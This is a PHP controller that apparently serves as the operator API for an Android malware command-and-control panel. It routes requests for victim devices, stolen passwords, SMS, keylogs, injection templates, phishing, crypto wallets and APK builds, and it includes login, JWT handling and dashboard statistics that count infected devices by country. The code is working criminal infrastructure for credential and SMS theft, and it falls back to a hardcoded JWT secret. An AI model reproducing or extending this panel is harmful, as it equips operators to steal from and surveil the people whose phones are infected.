<?php
declare(strict_types=1);

namespace app\controller;

use think\facade\Db;
use think\facade\Request;

/**
 * Adapter that exposes the v2.0-node (eagle) panel contract on top of the
 * local ThinkPHP + node-ws + MySQL stack, so the original front-end bundle runs
 * unchanged with real data.
 */
class MApiController
{
    protected string $path = '';
    protected string $method = '';
    protected ?array $user = null;
    protected array $body = [];
    protected array $query = [];

    public function dispatch()
    {
        $uri = (string)($_SERVER['REQUEST_URI'] ?? '/');
        $uri = explode('?', $uri)[0];
        $this->path = trim(preg_replace('#^/m/?#', '', $uri), '/');
        $this->method = strtoupper((string)($_SERVER['REQUEST_METHOD'] ?? 'GET'));
        $this->query = $_GET ?: [];

        $raw = file_get_contents('php://input') ?: '';
        if (strncmp($raw, "\xEF\xBB\xBF", 3) === 0) $raw = substr($raw, 3);
        $json = json_decode($raw, true);
        $this->body = is_array($json) ? $json : array_merge($_GET, $_POST);

        $seg = $this->path === '' ? [] : explode('/', $this->path);
        $head = $seg[0] ?? '';

        if ($head === 'login' && $this->method === 'POST') return $this->login();
        if ($head === 'ping' || $head === 'heartbeat') return $this->json(['success' => true, 'data' => ['pong' => time()]]);
        if ($head === 'authcheck') return $this->json(['success' => true, 'data' => null]);
        if ($head === 'translate') return $this->translate();
        if ($head === 'forex') return $this->forex();

        $this->user = $this->authenticate();
        if (!$this->user) {
            if ($this->method === 'GET') {
                error_log('[m-adapter] anonymous GET /m/' . $this->path);
                return $this->json([]);
            }
            return $this->json(['success' => false, 'error' => 'unauthorized'], 401);
        }
        if ($head === 'logout') return $this->json(['success' => true, 'data' => null]);

        try {
            return $this->route($seg);
        } catch (\Throwable $e) {
            error_log('[m-adapter] EX ' . $this->method . ' /m/' . $this->path . ' :: ' . $e->getMessage());
            return $this->json(['success' => false, 'error' => $e->getMessage(), 'data' => null], 500);
        }
    }

    protected function route(array $seg)
    {
        $head = $seg[0] ?? '';
        switch ($head) {
            case 'stats':           return $this->stats();
            case 'notices':         return $this->notices();
            case 'devices':         return $this->devices();
            case 'device-ids':      return $this->json(Db::table('fisher_devices')->column('device_id'));
            case 'groups':          return $this->groups();
            case 'group':           return $this->groupItem($seg[1] ?? null);
            case 'users':           return $this->users();
            case 'user':            return $this->userItem($seg);
            case 'device':          return $this->device($seg);
            case 'locale':          return $this->locale();
            case 'tg':              return $this->tg($seg);
            case 'telegram':        return $this->telegram($seg);
            case 'turn-nodes':      return $this->turnNodes($seg[1] ?? null);
            case 'turn-node':       return $this->turnNode($seg);
            case 'injections':      return $this->injections($seg);
            case 'injection':       return $this->injectionItem($seg);
            case 'credentials':     return $this->credentials();
            case 'credential':      return $this->credentialItem($seg);
            case 'sms':             return $this->smsItem($seg);
            case 'keylogs':         return $this->keylogs();
            case 'notifications':   return $this->notifications($seg);
            case 'bapp':            return $this->appRule('fisher_black_apps', $seg, 'disable');
            case 'sapp':            return $this->appRule('fisher_sensitive_apps', $seg, 'delay');
            case 'blacklist':       return $this->blacklist($seg);
            case 'paystg':          return $this->paystg($seg);
            case 'payrec':          return $this->payrec($seg);
            case 'security':        return $this->security($seg);
            case 'autocommands':    return $this->autocommands();
            case 'autocommand':     return $this->autocommandItem($seg);
            case 'builds':          return $this->builds();
            case 'build':           return $this->buildRoute($seg);
            case 'abuild':          return $this->abuild($seg);
            case 'ai':              return $this->ai($seg);
            case 'cryptowallet':    return $this->cryptowallet($seg);
            case 'smsnoti':         return $this->notiRule('fisher_sms_notify_keywords', 'keyword', $seg);
            case 'notifnoti':       return $this->notiRule('fisher_notif_notify_packages', 'package_name', $seg);
            case 'notifyrules':     return $this->notifyrules($seg);
            case 'phish':           return $this->phish($seg);
            case 'bnotify':         return $this->bnotify();
            case 'batch':           return $this->batch($seg);
            case 'change-password': return $this->changePassword();
            case 'self':            return $this->json(['success' => true, 'data' => null]);
        }
        return $this->generic($seg);
    }

    // ================= auth =================
    protected function secret(): string
    {
        $s = (string)env('JWT.JWT_SECRET', '');
        if (strlen($s) < 32) $s = 'local-dev-secret-0123456789abcdef0123456789abcdef';
        return $s;
    }

    protected function b64(string $d): string
    {
        return rtrim(strtr(base64_encode($d), '+/', '-_'), '=');
    }

    protected function issueToken(array $u): string
    {
        $h = $this->b64(json_encode(['typ' => 'JWT', 'alg' => 'HS256']));
        $p = $this->b64(json_encode([
            'user_id'  => (int)$u['id'],
            'username' => $u['username'],
            'role'     => $u['role'],
            'exp'      => time() + 86400 * 30,
        ]));
        return $h . '.' . $p . '.' . $this->b64(hash_hmac('sha256', $h . '.' . $p, $this->secret(), true));
    }

    protected function authenticate(): ?array
    {
        $hdr = (string)Request::header('authorization', '');
        if (!preg_match('/Bearer\s+(.+)/i', $hdr, $m)) return null;
        $parts = explode('.', trim($m[1]));
        if (count($parts) !== 3) return null;
        $expect = $this->b64(hash_hmac('sha256', $parts[0] . '.' . $parts[1], $this->secret(), true));
        if (!hash_equals($expect, $parts[2])) return null;
        $payload = json_decode((string)base64_decode(strtr($parts[1], '-_', '+/')), true);
        if (!is_array($payload) || (int)($payload['exp'] ?? 0) < time()) return null;
        $u = Db::table('fisher_users')->where('id', (int)$payload['user_id'])->find();
        if (!$u) return null;
        if (isset($u['enabled']) && !(int)$u['enabled']) return null;
        return $u;
    }

    protected function login()
    {
        $username = trim((string)($this->body['username'] ?? ''));
        $password = (string)($this->body['password'] ?? '');
        if ($username === '' || $password === '') {
            return $this->json(['success' => false, 'error' => '用户名和密码不能为空'], 400);
        }
        $u = Db::table('fisher_users')->where('username', $username)->find();
        $ok = $u && password_verify($password, (string)$u['password_hash']);
        try {
            Db::table('fisher_login_logs')->insert([
                'username'   => $username,
                'ip'         => (string)Request::ip(),
                'user_agent' => substr((string)Request::header('user-agent', ''), 0, 255),
                'success'    => $ok ? 1 : 0,
                'created_at' => time(),
            ]);
        } catch (\Throwable $e) {}
        if (!$ok) return $this->json(['success' => false, 'error' => '用户名或密码错误'], 401);
        if (isset($u['enabled']) && !(int)$u['enabled']) {
            return $this->json(['success' => false, 'error' => '该账号已被禁用'], 403);
        }
        try { Db::table('fisher_users')->where('id', (int)$u['id'])->update(['last_login' => time()]); } catch (\Throwable $e) {}
        return $this->json([
            'token' => $this->issueToken($u),
            'role'  => $u['role'] ?: 'admin',
            'user'  => ['username' => $u['username'], 'role' => $u['role'] ?: 'admin', 'avatar' => (string)($u['avatar'] ?? '')],
            'success' => true,
        ]);
    }

    protected function changePassword()
    {
        $old = (string)($this->body['old_password'] ?? $this->body['oldPassword'] ?? '');
        $new = (string)($this->body['new_password'] ?? $this->body['newPassword'] ?? $this->body['password'] ?? '');
        if ($new === '') return $this->json(['success' => false, 'error' => '新密码不能为空'], 400);
        $u = Db::table('fisher_users')->where('id', (int)$this->user['id'])->find();
        if ($old !== '' && !password_verify($old, (string)$u['password_hash'])) {
            return $this->json(['success' => false, 'error' => '原密码错误'], 400);
        }
        Db::table('fisher_users')->where('id', (int)$u['id'])
            ->update(['password_hash' => password_hash($new, PASSWORD_BCRYPT)]);
        return $this->json(['success' => true, 'message' => '密码已修改', 'data' => null]);
    }

    // ================= dashboard / server =================
    protected function stats()
    {
        $total  = (int)Db::table('fisher_devices')->count();
        $online = (int)Db::table('fisher_devices')->where('is_connected', 1)->count();
        $byCountry = Db::table('fisher_devices')->field('country, COUNT(*) AS n')->group('country')->select()->toArray();
        $rows = [];
        foreach ($byCountry as $r) {
            if (($r['country'] ?? '') !== '') $rows[] = ['country' => $r['country'], 'name' => (string)$r['country'], 'count' => (int)$r['n'], 'value' => (int)$r['n']];
        }
        return $this->json([
            'devices_total'    => $total,
            'devices_online'   => $online,
            'online_count'     => $online,
            'devices_offline'  => max(0, $total - $online),
            'users_total'      => (int)Db::table('fisher_users')->count(),
            'sms_total'        => (int)Db::table('fisher_sms_messages')->count(),
            'password_total'   => (int)Db::table('fisher_passwords')->count(),
            'injection_total'  => (int)Db::table('fisher_injection_templates')->count(),
            'builds_total'     => (int)Db::table('fisher_apk_build_configs')->count(),
            'keylogs_total'    => (int)Db::table('fisher_operation_logs')->count(),
            'credentials_total'=> (int)Db::table('fisher_passwords')->count(),
            'installs_total'   => (int)Db::table('fisher_device_apps')->count(),
            'server_version'   => 'v2.0-node (local)',
            'version'          => 'v2.0-node (local)',
            'uptime'           => $this->uptime(),
            'countries'        => $rows,
            'device_distribution' => $rows,
            'generated_at'     => time(),
            'system'           => $this->sysinfo(),
            'diagnostics'      => $this->diagnostics($total, $online),
        ]);
    }

    protected function uptime(): int
    {
        $f = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'mpanel_boot';
        if (!is_file($f)) { @file_put_contents($f, (string)time()); return 3600; }
        $t = (int)@file_get_contents($f);
        return max(1, time() - ($t > 0 ? $t : time() - 3600));
    }

    protected function sysinfo(): array
    {
        $cache = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'mpanel_sys.json';
        if (is_file($cache) && (time() - (int)@filemtime($cache)) < 20) {
            $d = json_decode((string)@file_get_contents($cache), true);
            if (is_array($d)) return $d;
        }
        $cores = (int)@shell_exec('echo %NUMBER_OF_PROCESSORS%');
        if ($cores < 1) $cores = 4;
        $cpuModel = '';
        $memTotal = 0;
        try {
            $o = (string)@shell_exec('wmic cpu get name /value 2>NUL');
            if (preg_match('/Name=(.+)/', $o, $m)) $cpuModel = trim($m[1]);
        } catch (\Throwable $e) {}
        try {
            $o = (string)@shell_exec('wmic ComputerSystem get TotalPhysicalMemory /value 2>NUL');
            if (preg_match('/TotalPhysicalMemory=(\d+)/', $o, $m)) $memTotal = (int)$m[1];
        } catch (\Throwable $e) {}
        if ($memTotal <= 0) $memTotal = 8 * 1024 * 1024 * 1024;
        $diskTotal = (float)@disk_total_space('C:');
        $diskFree  = (float)@disk_free_space('C:');
        if ($diskTotal <= 0) $diskTotal = 1;
        $d = [
            'os'             => PHP_OS_FAMILY . ' ' . php_uname('r'),
            'php_version'    => PHP_VERSION,
            'node_version'   => trim((string)@shell_exec('node -v 2>NUL')),
            'cpu_cores'      => $cores,
            'cpu_model'      => $cpuModel !== '' ? $cpuModel : 'Generic CPU',
            'cpu_usage'      => 0,
            'uptime'         => $this->uptime(),
            'mem_usage'      => 0,
            'mem_total'      => (int)$memTotal,
            'mem_used'       => 0,
            'mem_free'       => (int)$memTotal,
            'disk_usage'     => round((1 - $diskFree / $diskTotal) * 100, 1),
            'disk_total'     => (int)$diskTotal,
            'disk_used'      => (int)($diskTotal - $diskFree),
            'disk_free'      => (int)$diskFree,
            'net_send_speed' => 0,
            'net_recv_speed' => 0,
            'net_bytes_sent' => 0,
            'net_bytes_recv' => 0,
        ];
        @file_put_contents($cache, json_encode($d));
        return $d;
    }

    protected function diagnostics(int $total, int $online): array
    {
        $t0 = microtime(true);
        try { Db::query('SELECT 1'); $ping = (int)round((microtime(true) - $t0) * 1000); } catch (\Throwable $e) { $ping = -1; }
        $maxOpen = 151;
        try {
            $r = Db::query('SHOW VARIABLES LIKE "max_connections"');
            if (!empty($r[0]['Value'])) $maxOpen = (int)$r[0]['Value'];
        } catch (\Throwable $e) {}
        $threads = 0;
        try {
            $r = Db::query('SHOW STATUS LIKE "Threads_connected"');
            if (!empty($r[0]['Value'])) $threads = (int)$r[0]['Value'];
        } catch (\Throwable $e) {}
        $pending = (int)Db::table('fisher_pending_commands')->count();
        return [
            'db_ping_ms'        => $ping,
            'db_max_open'       => $maxOpen,
            'db_in_use'         => $threads,
            'db_idle'           => max(0, $maxOpen - $threads),
            'go_heap_alloc'     => memory_get_usage(true),
            'msg_queue_used'    => $pending,
            'msg_queue_cap'     => 10000,
            'ws_device_conns'   => $online,
            'ws_viewer_conns'   => 1,
            'active_sessions'   => 1,
            'devices_total'     => $total,
            'uptime'            => $this->uptime(),
        ];
    }

